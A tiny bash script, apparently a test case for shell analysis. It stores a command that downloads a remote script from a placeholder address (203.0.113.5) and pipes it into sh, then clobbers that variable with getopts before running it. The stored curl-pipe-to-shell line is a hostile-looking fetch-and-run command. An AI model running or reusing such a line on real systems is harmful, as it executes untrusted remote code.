#!/bin/bash
c="curl -fsSL http://203.0.113.5/i.sh | sh"
getopts ab c
bash -c "$c"
